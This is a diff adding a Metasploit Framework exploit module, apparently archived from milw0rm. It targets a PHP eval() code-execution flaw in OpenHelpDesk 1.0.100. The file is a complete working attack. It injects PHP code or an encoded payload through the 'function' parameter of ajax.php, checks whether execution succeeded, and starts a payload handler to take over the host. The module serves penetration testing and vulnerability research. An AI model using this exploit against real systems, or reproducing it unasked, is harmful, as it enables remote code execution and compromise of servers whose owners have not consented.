@@ -1,0 +1,90 @@
+##
+# $Id: php_eval.rb 5783 2008-10-23 02:43:21Z ramon $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'OpenHelpDesk eval (previously unpublished)',
+			'Description'    => %q{
+				OpenHelpDesk version 1.0.100 is vulnerable to a php code
+				execution vulnerability due to improper use of eval().
+				The php.ini register_globals directive is *not* required to be
+				on to exploit this vulnerability.  There is no known public
+				exploit for this vulnerability.
+			},
+			'Author'         => [ 'LSO <lso@hushmail.com>' ],
+			'License'        => BSD_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     => [ 'URL' , 'http://sourceforge.net/projects/openhelpdesk' ],
+			'Privileged'     => false,
+			'Platform'       => ['php'],
+            'Arch'           => ARCH_PHP,
+			'Payload'        => 
+				{
+					'Space'       => 4000,  # max url length for some old
+											# versions of apache according to
+											# http://www.boutell.com/newfaq/misc/urllength.html
+					'DisableNops' => true,
+					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
+					'Compat'      => 
+						{
+							'ConnectionType' => 'find',
+						},
+					'Keys'        => ['php'],
+				},
+			'Targets'        => [ ['Automatic', { }], ],
+			'DefaultTarget' => 0
+			))
+
+		register_options(
+			[
+				OptString.new('URIPATH',   [ true,  "The URI of ajax.php ", '/openhelpdesk/ajax.php']),
+			], self.class)
+	
+	end
+
+	def check
+		tester = rand_text_alpha(10)
+		php_code = "echo('#{tester}');"
+
+		response = eval_sploit(php_code)
+
+		#print_status(response)
+		if (response && response.body.match(tester).to_a.first)
+			print_status("PHP code execution achieved; safe_mode or disable_functions might still prevent host compromise")
+			checkcode = Exploit::CheckCode::Vulnerable
+		else
+			checkcode = Exploit::CheckCode::Safe
+		end
+		return checkcode
+	end
+
+	def exploit
+		response = eval_sploit(payload.encoded)
+
+		handler
+	end
+
+	def eval_sploit(php_code)
+		uri  = datastore['URIPATH'] + "?function=" + php_code + "//"
+		response = send_request_raw({ 'uri' => uri },1)
+		return response
+	end
+end
+
+# milw0rm.com [2009-02-02]
